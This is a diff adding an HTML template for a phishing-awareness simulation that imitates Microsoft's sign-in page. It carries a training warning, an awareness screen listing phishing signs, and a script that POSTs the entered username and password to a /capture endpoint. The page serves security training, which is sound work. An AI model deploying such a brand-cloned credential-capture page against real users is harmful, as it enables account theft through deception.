@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to your Microsoft account</title>
+<style>
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
+body {{
+    font-family: 'Segoe UI', 'Segoe UI Web', Arial, Verdana, sans-serif;
+    background-color: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}}
+.edu-banner {{
+    background: #ff3d00;
+    color: #fff;
+    width: 100%;
+    text-align: center;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 700;
+    position: fixed;
+    top: 0;
+    z-index: 999;
+}}
+.container {{
+    margin-top: 60px;
+    width: 100%;
+    max-width: 440px;
+    padding: 20px;
+}}
+.card {{
+    background: #fff;
+    padding: 44px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+}}
+.logo {{
+    text-align: center;
+    margin-bottom: 16px;
+}}
+.ms-logo {{
+    font-size: 21px;
+    font-weight: 600;
+    color: #5e5e5e;
+}}
+.ms-icon {{
+    display: inline-block;
+    width: 21px;
+    height: 21px;
+    margin-right: 8px;
+    vertical-align: middle;
+}}
+.ms-squares {{
+    display: grid;
+    grid-template-columns: 10px 10px;
+    grid-gap: 1px;
+    width: 21px;
+    height: 21px;
+}}
+.sq {{ width: 10px; height: 10px; }}
+.sq1 {{ background: #f25022; }}
+.sq2 {{ background: #7fba00; }}
+.sq3 {{ background: #00a4ef; }}
+.sq4 {{ background: #ffb900; }}
+.title {{
+    text-align: center;
+    font-size: 24px;
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: #1b1b1b;
+}}
+.subtitle {{
+    text-align: center;
+    font-size: 15px;
+    color: #1b1b1b;
+    margin-bottom: 24px;
+}}
+.field {{
+    margin-bottom: 16px;
+}}
+.field input {{
+    width: 100%;
+    padding: 8px 12px;
+    border: 1px solid #8a8886;
+    font-size: 15px;
+    color: #1b1b1b;
+    outline: none;
+    transition: border-color 0.2s;
+}}
+.field input:focus {{
+    border-color: #0078d4;
+    border-width: 2px;
+    padding: 7px 11px;
+}}
+.checkbox-row {{
+    margin: 16px 0;
+    font-size: 15px;
+}}
+.checkbox-row input {{
+    margin-right: 8px;
+}}
+.checkbox-row label {{
+    color: #1b1b1b;
+    cursor: pointer;
+}}
+.link {{
+    color: #0067b8;
+    font-size: 13px;
+    text-decoration: none;
+    margin-top: 12px;
+    display: inline-block;
+}}
+.link:hover {{
+    text-decoration: underline;
+}}
+.btn-container {{
+    margin-top: 24px;
+    text-align: right;
+}}
+.btn-primary {{
+    background-color: #0067b8;
+    border: 1px solid #0067b8;
+    color: #fff;
+    font-size: 15px;
+    padding: 8px 32px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+}}
+.btn-primary:hover {{
+    background-color: #005a9e;
+}}
+.warning-footer {{
+    background: #fff4ce;
+    border: 1px solid #ffb900;
+    padding: 12px;
+    margin-top: 20px;
+    font-size: 13px;
+    color: #323130;
+    text-align: center;
+}}
+.hidden {{ display: none; }}
+.awareness-screen {{
+    background: #fff;
+    padding: 44px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    text-align: center;
+}}
+.awareness-screen h2 {{ color: #d13438; margin-bottom: 16px; }}
+.awareness-screen ul {{
+    text-align: left;
+    margin: 20px auto;
+    max-width: 400px;
+    line-height: 2;
+    color: #1b1b1b;
+}}
+.indicator {{
+    background: #fff4ce;
+    border: 1px solid #ffb900;
+    padding: 16px;
+    margin-top: 20px;
+    font-size: 14px;
+    text-align: left;
+}}
+</style>
+</head>
+<body>
+ 
+
+<div class="container" id="loginContainer">
+    <div class="card">
+        <div class="logo">
+            <div class="ms-logo">
+                <div class="ms-icon ms-squares" style="display: inline-grid;">
+                    <div class="sq sq1"></div>
+                    <div class="sq sq2"></div>
+                    <div class="sq sq3"></div>
+                    <div class="sq sq4"></div>
+                </div>
+                Microsoft
+            </div>
+        </div>
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">to continue to Microsoft</p>
+        <form id="simForm" onsubmit="showAwareness(event)">
+            <div class="field">
+                <input type="text" id="email" placeholder="Email, phone, or Skype" autocomplete="off" required>
+            </div>
+            <div class="field">
+                <input type="password" id="password" placeholder="Password" autocomplete="off" required>
+            </div>
+            <a href="#" class="link">Can't access your account?</a>
+            <div class="checkbox-row">
+                <input type="checkbox" id="remember">
+                <label for="remember">Keep me signed in</label>
+            </div>
+            <div class="btn-container">
+                <button type="submit" class="btn-primary">Sign in</button>
+            </div>
+        </form>
+        <div class="warning-footer">
+            ⚠️ This is a phishing simulation for training purposes
+        </div>
+    </div>
+</div>
+
+<div class="container hidden" id="awareness">
+    <div class="awareness-screen">
+        <h2>🛡️ You've Been Phished (Simulated!)</h2>
+        <p>
+            In a real attack, your credentials would now be stolen.
+            Your entered credentials have been captured for this demonstration.
+        </p>
+        <ul>
+            <li>🔗 URL should be login.microsoftonline.com</li>
+            <li>🔒 Verify Microsoft's SSL certificate</li>
+            <li>📧 Avoid clicking email login links</li>
+            <li>🔤 Watch for typos (micros0ft, rnicrosoft)</li>
+            <li>🎨 Check Microsoft's authentic branding</li>
+        </ul>
+        <div class="indicator">
+            <strong>Phishing indicators on this page:</strong><br>
+            {indicators}
+        </div>
+    </div>
+</div>
+
+<script>
+function showAwareness(e) {{
+  e.preventDefault();
+  const username = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  
+  if (username && password) {{
+    fetch('/capture', {{
+      method: 'POST',
+      headers: {{ 'Content-Type': 'application/json' }},
+      body: JSON.stringify({{
+        username: username,
+        password: password,
+        preset: '{preset_key}'
+      }})
+    }}).catch(err => console.log('Capture endpoint unavailable'));
+  }}
+  
+  document.querySelectorAll('input').forEach(i => i.value = '');
+  document.getElementById('loginContainer').classList.add('hidden');
+  document.getElementById('awareness').classList.remove('hidden');
+}}
+</script>
+</body>
+</html>
